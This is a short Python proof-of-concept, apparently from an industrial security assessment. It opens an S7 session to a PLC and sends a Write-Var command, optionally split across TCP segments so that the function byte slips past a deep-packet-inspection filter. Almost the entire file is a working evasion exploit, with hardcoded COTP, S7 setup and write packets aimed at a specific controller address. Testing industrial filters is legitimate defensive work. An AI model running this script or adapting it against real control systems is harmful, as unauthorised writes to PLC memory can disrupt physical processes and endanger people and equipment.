#!/usr/bin/env python3
# Prove the DPI fragmentation gap. Real (allowlisted) S7 session .2.31 -> PLC1, then a Write-Var
# (func 0x05) sent whole OR split so the function byte at offset 17 falls in a 2nd TCP segment.
import socket, sys, time, argparse
PLC="192.168.2.10"; PORT=102
COTP_CR  = bytes.fromhex("0300001611e00000000100c1020100c2020101c0010a")
S7_SETUP = bytes.fromhex("0300001902f08032010000000100080000f0000001000101e0")
WRITEVAR = bytes.fromhex("0300002402f080320100000000000e00050501120a10020001000081000050ff0400080c")
def main():
    ap=argparse.ArgumentParser()
    ap.add_argument("--split", type=int, default=0, help="split Write-Var at byte N (0=whole; 14 puts 0x05 in seg2)")
    ap.add_argument("--gap", type=float, default=0.03)
    a=ap.parse_args()
    s=socket.create_connection((PLC,PORT), timeout=5)
    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)     # Nagle off: each send() = its own segment
    s.sendall(COTP_CR);  s.recv(512)
    s.sendall(S7_SETUP); s.recv(512)
    print("[*] S7 session established .2.31 -> %s (allowlisted conduit)" % PLC)
    if a.split<=0 or a.split>=len(WRITEVAR):
        s.send(WRITEVAR); print("[*] Write-Var sent WHOLE (%dB, one segment)" % len(WRITEVAR))
    else:
        s.send(WRITEVAR[:a.split]); time.sleep(a.gap); s.send(WRITEVAR[a.split:])
        print("[*] Write-Var FRAGMENTED: seg1=%dB seg2=%dB (0x05 now in seg2)" % (a.split, len(WRITEVAR)-a.split))
    try: r=s.recv(512); print("[+] PLC replied %dB: %s" % (len(r), r[:12].hex()))
    except Exception as e: print("[!] no reply (%s)" % e)
    s.close()
main()
